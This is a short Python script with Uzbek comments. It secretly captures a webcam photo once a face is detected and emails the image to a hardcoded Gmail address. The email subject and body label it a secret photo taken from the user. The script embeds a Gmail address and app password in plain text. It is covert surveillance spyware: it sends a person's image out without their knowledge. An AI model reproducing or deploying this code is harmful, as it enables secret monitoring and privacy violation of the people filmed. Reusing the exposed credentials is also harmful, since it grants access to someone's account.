# import cv2

# # Kamerani ishga tushirish
# cap = cv2.VideoCapture(0)

# # Yuz aniqlash uchun Haar Cascade
# face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")

# captured = False

# while True:
#     ret, frame = cap.read()
#     if not ret:
#         break

#     # Yuzni aniqlash
#     gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
#     faces = face_cascade.detectMultiScale(gray, 1.3, 5)

#     for (x, y, w, h) in faces:
#         if not captured:
#             cv2.imwrite("yashirin_yuz.jpg", frame)
#             print("✅ Yuz tabiiy ifoda bilan rasmga olindi!")
#             captured = True
#             break

#     if captured:
#         break

# cap.release()

import cv2
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# ===== Email orqali yuborish funksiyasi =====
def yubor(email, password, receiver, subject, message, file_path=None):
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = receiver
    msg['Subject'] = subject

    msg.attach(MIMEText(message, 'plain'))

    if file_path:
        with open(file_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename={file_path}',
            )
            msg.attach(part)

    # Gmail serveriga ulanish va yuborish
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.send_message(msg)
    server.quit()
    print("📧 Email yuborildi!")

# ===== Kamera orqali yashirin surat olish =====
def yashirin_surat_ol():
    cap = cv2.VideoCapture(0)
    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + "haarcascade_frontalface_default.xml")

    captured = False
    file_name = "yashirin_yuz.jpg"

    while True:
        ret, frame = cap.read()
        if not ret:
            break

        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
        faces = face_cascade.detectMultiScale(gray, 1.3, 5)

        for (x, y, w, h) in faces:
            if not captured:
                cv2.imwrite(file_name, frame)
                print("Surat olindi:", file_name)
                captured = True
                break

        if captured:
            break

    cap.release()
    return file_name

if __name__ == "__main__":
    file_path = yashirin_surat_ol()

    yubor(
        email="azizovalisher7377@gmail.com",              
        password="fajn rsom yhhf eait",         
        receiver="azizovalisher7377@gmail.com",           
        subject="Yashirin surat",               
        message="foydalanuvchidan yashirin surat olindi.",  
        file_path=file_path                     
    )
